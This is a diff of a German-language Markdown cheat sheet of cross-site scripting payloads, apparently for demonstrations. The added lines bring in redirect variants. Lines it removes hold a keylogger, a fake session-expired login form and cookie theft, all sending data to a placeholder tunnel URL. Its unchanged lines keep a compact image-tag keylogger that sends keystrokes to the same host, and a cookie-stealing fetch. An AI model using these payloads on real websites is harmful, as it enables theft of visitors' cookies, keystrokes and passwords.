@@ -20,12 +20,17 @@
 
 **Redirect (z.B. zu Amazon)**
 ```html
-<img src=x onerror="window.location='https://amazon.com'">
+<img src=x onerror="window.location='https://amazon.de'">
 ```
 
-**Fake Login-Form**
+**Alternative mit Script-Tag:**
 ```html
-<img src=x onerror="document.body.innerHTML='<div style=\"max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.1)\"><h2 style=\"text-align:center\">Login</h2><form onsubmit=\"alert(document.getElementById(\'e\').value+\' \'+document.getElementById(\'p\').value);return false\"><input id=\"e\" type=\"email\" placeholder=\"E-Mail\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><input id=\"p\" type=\"password\" placeholder=\"Passwort\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><button type=\"submit\" style=\"width:100%;background:#000;color:white;padding:12px;border:none;border-radius:4px;cursor:pointer\">Login</button></form></div>'">
+<script>window.location='https://amazon.de'</script>
+```
+
+**Mit window.location.href:**
+```html
+<img src=x onerror="window.location.href='https://amazon.de'">
 ```
 
 **Keylogger (Console)**
@@ -108,35 +113,10 @@ fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie+'&url='+window
 ---
 
 ### Keylogger mit Server
-```html
-<script>
-var k='';
-document.onkeydown=function(e){
-  k+=e.key;
-  if(k.length>20){
-    fetch('https://YOUR_TUNNELMOLE_URL/keys?data='+encodeURIComponent(k)+'&url='+location.href);
-    k='';
-  }
-}
-</script>
-```
 
 **Kompakte IMG-Version:**
 ```html
 <img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;if(k.length>20){fetch('https://YOUR_TUNNELMOLE_URL/keys?data='+encodeURIComponent(k));k=''}}">
-```
-
----
-
-### Cookie-Diebstahl + Phishing Login
-```html
-<script>
-// Cookies stehlen
-fetch('https://YOUR_TUNNELMOLE_URL/steal?cookie='+document.cookie);
-
-// Fake Login anzeigen
-document.body.innerHTML='<div style="max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.1)"><h2 style="text-align:center">Sitzung abgelaufen - Bitte erneut anmelden</h2><form onsubmit="fetch(\'https://YOUR_TUNNELMOLE_URL/phishing?email=\'+document.getElementById(\'e\').value+\'&pass=\'+document.getElementById(\'p\').value);alert(\'Login erfolgreich!\');return false"><input id="e" type="email" placeholder="E-Mail" required style="width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px"><input id="p" type="password" placeholder="Passwort" required style="width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px"><button type="submit" style="width:100%;background:#000;color:white;padding:12px;border:none;border-radius:4px;cursor:pointer">Anmelden</button></form></div>';
-</script>
 ```
 
 ---
@@ -159,4 +139,3 @@ document.onkeydown=function(e){
 </script>
 ```
 
----
